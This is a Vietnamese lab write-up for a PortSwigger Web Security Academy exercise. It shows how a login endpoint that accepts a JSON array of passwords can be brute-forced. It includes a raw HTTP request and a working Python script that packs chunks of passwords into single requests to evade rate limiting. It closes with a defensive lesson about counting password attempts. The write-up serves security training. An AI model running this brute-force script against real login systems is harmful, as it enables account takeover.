
-mô tả lab: lab này block IP rất gắt, nhưng endpoint `/login` lại nhận JSON và cho phép trường `password` là 1 mảng. Mình sẽ nhét cả chục password vào 1 request.

> [!NOTE]
> -link lab: https://portswigger.net/web-security/authentication/password-based/lab-broken-brute-force-protection-multiple-credentials-per-request
![[Pasted image 20261018175224.png]]
### hướng giải
- [ ] mình bắt request login, sau đó quan sát gói tin này, mình thấy `Content-Type: application/json` và body là `{"username":"carlos", "password":"test"}`
- [ ] mình thử đổi thành `{"username":"carlos", "password":["test","test2","montoya"]}`, mình thấy server vẫn trả `200` bình thường, không báo lỗi JSON
- [ ] => nên mình đoán là server nó duyệt từng phần tử trong mảng, trúng cái nào là cho login luôn
- [ ] nên mình sẽ brute bằng cách nhét cả list password vào 1 request, bypass được rate-limit
![[Pasted image 20261018183740.png]]
![[Pasted image 20261018175416.png]]
### giải
-bước 1: mình chuyển request sang JSON như này, lưu thành `login.json.txt`:
```
POST /login HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=SESSION_CUA_MINH
Content-Type: application/json

{"username":"carlos", "password":["PASS1","PASS2","PASS3"]}
```
-nhưng ffuf mặc định chỉ thay 1 chỗ, nên mình sẽ dùng script python để tự gen body cho nhanh, hoặc mình dùng Burp Intruder.

-cách của mình hay dùng nhất là viết script python:
```python
import requests
passwords = open("passwords.txt").read().splitlines()
# mình chia list thành từng chunk 20 password
for i in range(0, len(passwords), 20):
    chunk = passwords[i:i+20]
    r = requests.post("https://LAB-ID.web-security-academy.net/login",
        cookies={"session":"SESSION_CUA_MINH"},
        json={"username":"carlos", "password": chunk},
        allow_redirects=False)
    # sau khi quan sát gói tin này, mình thấy khi trúng thì nó trả 302, còn sai thì 200
    if r.status_code == 302:
        print(f"trúng ở chunk {i}: {chunk}")
        break
```

![[Pasted image 20261018180830.png]]
-bước 2: khi mình thấy chunk nào trả `302`, mình tách nhỏ chunk đó ra thử tay từng password 1 là ra.
-kết quả là `carlos:montoya`.

> [!NOTE]
> -> hoặc là đơn giản hơn, gửi luôn cái chunk đó vào burp -> 302 login thành công--> lấy cái cookie session đó để đăng nhập để pass bài lab 
![[Pasted image 20261018182304.png]]
-> hoặc response in browser
![[Pasted image 20261018183153.png]]
-mình login lại là solve.

> [!NOTE]
> -bài học của mình: rate-limit mà đếm theo request thì chết, vì attacker nhét 100 password vào 1 request thì đếm cũng như không. Phải đếm theo số lần thử password.

